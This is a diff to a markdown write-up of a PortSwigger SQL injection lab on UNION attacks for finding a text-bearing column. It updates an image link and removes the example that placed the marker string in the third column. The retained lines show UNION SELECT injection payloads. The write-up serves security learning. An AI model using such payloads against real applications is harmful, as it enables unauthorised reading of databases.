@@ -39,13 +39,8 @@ SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'HgP47P',NULL
 SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'HgP47P',NULL
 ```
 
-![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/84002f8217a3c24f74ca65aae11c3fb98c17496a/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/Images/Payload%20in%202nd%20NULL.png)
+![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/8fa7e370a8f3e98a2ade6a821067d3d503ba3459/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/Images/Payload%20in%202nd%20NULL.png)
 
-**HgP47P in 3rd NULL -**
-
-```sql
-SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,NULL,'HgP47P'
-```
 
 ![image]()
 
